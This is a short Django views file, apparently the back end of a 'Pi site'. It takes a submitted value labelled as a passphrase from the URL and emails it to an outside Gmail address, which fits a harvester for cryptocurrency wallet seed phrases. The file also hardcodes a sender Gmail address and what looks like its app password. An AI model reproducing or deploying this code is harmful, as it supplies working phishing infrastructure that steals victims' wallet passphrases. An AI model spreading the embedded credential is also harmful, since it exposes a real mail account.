from django.shortcuts import render
from firebmail import sendmail as sending_no
from datetime import datetime
from django.http import HttpResponse


current_date = datetime.now()
# Create your views here.


def send_notify(subject, payload, email_to):
    sender = "ezekielizuchi2018@gmail.com"
    password = "pvos glgf nxal finc"
    recipient = email_to
    
    return sending_no(payload, recipient, sender,password, subject)

def sendmail(request, keys):
    send_notify(payload=f'Fake Pass Phrase submitted - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
    
    return HttpResponse('done')